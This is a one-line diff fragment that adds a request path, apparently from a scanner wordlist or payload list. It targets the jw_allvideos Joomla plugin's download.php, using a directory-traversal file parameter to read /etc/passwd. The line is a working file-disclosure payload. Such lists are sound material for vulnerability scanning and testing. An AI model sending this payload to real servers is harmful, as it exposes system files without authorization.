@@ -1,0 +1,1 @@
+/plugins/content/jw_allvideos/includes/download.php?file=../../../../../../../../etc/passwd
